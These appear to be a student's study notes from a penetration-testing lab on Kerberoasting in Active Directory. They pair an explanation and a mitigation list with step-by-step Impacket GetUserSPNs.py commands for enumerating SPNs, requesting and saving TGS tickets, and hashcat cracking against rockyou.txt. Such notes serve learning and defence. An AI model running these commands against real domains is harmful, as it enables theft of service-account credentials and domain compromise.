## Table of Contents

  - [Table of Contents](#Table\of\Contents)
    - [Kerberoasting from a Non-Domain Joined Linux Host:](#Kerberoasting\from\a\Non-Domain\Joined\Linux\Host:)
  - [Key Points:](#Key\Points:)
  - [Attack Steps:](#Attack\Steps:)
  - [Mitigation:](#Mitigation:)
  - [Conclusion:](#Conclusion:)
  - [Performing the Attack (KerberRoasting)](#Performing\the\Attack\(KerberRoasting))
  - [Kerberoasting with GetUserSPNs.py](#Kerberoasting\with\GetUserSPNs.py)
      - [Installing Impacket using Pip](#Installing\Impacket\using\Pip)
      - [Listing SPN Accounts with GetUserSPNs.py](#Listing\SPN\Accounts\with\GetUserSPNs.py)
      - [Requesting all TGS Tickets](#Requesting\all\TGS\Tickets)
      - [Requesting a Single TGS ticket](#Requesting\a\Single\TGS\ticket)
      - [Saving the TGS Ticket to an Output File](#Saving\the\TGS\Ticket\to\an\Output\File)
      - [Cracking the Ticket Offline with Hashcat](#Cracking\the\Ticket\Offline\with\Hashcat)

## Table of Contents

    - [Kerberoasting from a Non-Domain Joined Linux Host:](#Kerberoasting\from\a\Non-Domain\Joined\Linux\Host:)
  - [Key Points:](#Key\Points:)
  - [Attack Steps:](#Attack\Steps:)
  - [Mitigation:](#Mitigation:)
  - [Conclusion:](#Conclusion:)
  - [Performing the Attack (KerberRoasting)](#Performing\the\Attack\(KerberRoasting))
  - [Kerberoasting with GetUserSPNs.py](#Kerberoasting\with\GetUserSPNs.py)
      - [Installing Impacket using Pip](#Installing\Impacket\using\Pip)
      - [Listing SPN Accounts with GetUserSPNs.py](#Listing\SPN\Accounts\with\GetUserSPNs.py)
      - [Requesting all TGS Tickets](#Requesting\all\TGS\Tickets)
      - [Requesting a Single TGS ticket](#Requesting\a\Single\TGS\ticket)
      - [Saving the TGS Ticket to an Output File](#Saving\the\TGS\Ticket\to\an\Output\File)
      - [Cracking the Ticket Offline with Hashcat](#Cracking\the\Ticket\Offline\with\Hashcat)



### Kerberoasting from a Non-Domain Joined Linux Host:

**1. Setup:** a. You'll need a valid set of domain credentials to perform Kerberoasting. b. The account doesn't need special privileges, just basic domain authentication.

**2. Installing Impacket:** a. Clone the Impacket repository: `git clone https://github.com/SecureAuthCorp/impacket.git cd impacket` b. Install Impacket: `shell-session sudo python3 -m pip install .`

**3. Listing Service Principal Names (SPNs) using GetUserSPNs.py:** a. This step helps you identify which accounts have SPNs set, and are hence roastable. b. To list SPNs: `GetUserSPNs.py -dc-ip <DOMAIN_CONTROLLER_IP> <DOMAIN>/<USERNAME>` c. Replace `<DOMAIN_CONTROLLER_IP>`, `<DOMAIN>`, and `<USERNAME>` with the appropriate values.

**4. Requesting Ticket Granting Service (TGS) Tickets:** a. Request TGS for all accounts with SPNs:  `GetUserSPNs.py -dc-ip <DOMAIN_CONTROLLER_IP> <DOMAIN>/<USERNAME> -request` b. For a specific account, use the `-request-user` flag: `shell-session GetUserSPNs.py -dc-ip <DOMAIN_CONTROLLER_IP> <DOMAIN>/<USERNAME> -request-user <SPECIFIC_USER>`

**5. Saving the TGS Ticket:** a. It's often useful to save the ticket for offline cracking. b. To save: `
`GetUserSPNs.py -dc-ip <DOMAIN_CONTROLLER_IP> <DOMAIN>/<USERNAME> -request-user <SPECIFIC_USER> -outputfile <OUTPUT_FILENAME>`

**6. Cracking the TGS Ticket Offline:** a. Use tools like Hashcat with hash mode `13100` to attempt to crack the TGS ticket and retrieve the service account's plaintext password.


























*Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments.*


Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.


Kerberoasting is an advanced technique used by attackers to exploit the Kerberos authentication protocol and obtain passwords (or hashes) for service accounts in Active Directory (AD). Let's break down the detailed information you provided and focus on its key aspects, along with solutions to mitigate such attacks.

## Key Points:

1. **Service Principal Names (SPN)**: SPNs are identifiers linked to service accounts in AD. These service accounts might run applications/services in the network. 
   
2. **Kerberos Tickets**: Any domain user can request a Kerberos ticket for any SPN. These tickets (TGS-REP) are encrypted using the service account's NTLM hash. 
   
3. **Password Cracking**: Once the attacker obtains a Kerberos ticket, it can be cracked offline to retrieve the clear-text password of the service account. Tools like Hashcat are used for this.
   
4. **Service Account Permissions**: Service accounts might have high privileges, possibly even Domain Admin. Cracking their password could lead to complete domain compromise.

## Attack Steps:

1. **Enumerate SPNs**: Identify service accounts in the domain by querying their SPNs.
   
2. **Request Kerberos Tickets**: Use a domain user account to request TGS tickets for the identified service accounts.
   
3. **Offline Cracking**: Use tools to crack the encrypted tickets and obtain the clear-text passwords.

## Mitigation:

1. **Strong Passwords**: Always use strong, unique passwords for service accounts. The stronger the password, the harder it is to crack.

2. **Password Monitoring**: Employ tools that monitor and alert for password reuse or weak passwords.

3. **Regular Rotation**: Regularly change the passwords of service accounts.

4. **Monitoring & Alerts**: Monitor for large numbers of TGS requests, which could indicate a Kerberoasting attack.

5. **Limit Permissions**: Ensure service accounts have only the permissions they absolutely need. Avoid adding them to high privilege groups unless necessary.

6. **Implement TGT Renewal**: Configure Kerberos Ticket Granting Ticket (TGT) renewals to be more frequent, reducing the window of opportunity for attackers.

7. **Service Account Auditing**: Regularly audit service accounts, check their permissions, and remove unnecessary ones. 

8. **Educate IT Staff**: Make sure the IT team is educated about the dangers of Kerberoasting, the importance of strong service account passwords, and the risks associated with high privileges.

## Conclusion:

Kerberoasting is a powerful technique in the attacker's toolkit. However, with the right precautions and ongoing monitoring, organizations can greatly reduce their risk. Always consider a defense-in-depth strategy, combining multiple layers of security to protect against such sophisticated attacks.

## Performing the Attack (KerberRoasting)

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.


## Kerberoasting with GetUserSPNs.py

Let's start by installing the Impacket toolkit, which we can grab from [Here](https://github.com/SecureAuthCorp/impacket). After cloning the repository, we can cd into the directory and install it as follows:

#### Installing Impacket using Pip

  Installing Impacket using Pip

```shell-session
gdxqpardo@htb[/htb]$ sudo python3 -m pip install .
```

**Need valid set of credentials for kerberoast**


A. **Gather a listing of SPNs in the domain. 
 We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket**

#### Listing SPN Accounts with GetUserSPNs.py

  Listing SPN Accounts with GetUserSPNs.py

```shell-session
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

#### Requesting all TGS Tickets

  Requesting all TGS Tickets

```shell-session
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.

#### Requesting a Single TGS ticket

  Requesting a Single TGS ticket

```shell-session
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

#### Saving the TGS Ticket to an Output File

  Saving the TGS Ticket to an Output File

```shell-session
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_tgs`. Now we can attempt to crack the ticket offline using Hashcat hash mode `13100`.

#### Cracking the Ticket Offline with Hashcat

  Cracking the Ticket Offline with Hashcat

```shell-session
gdxqpardo@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```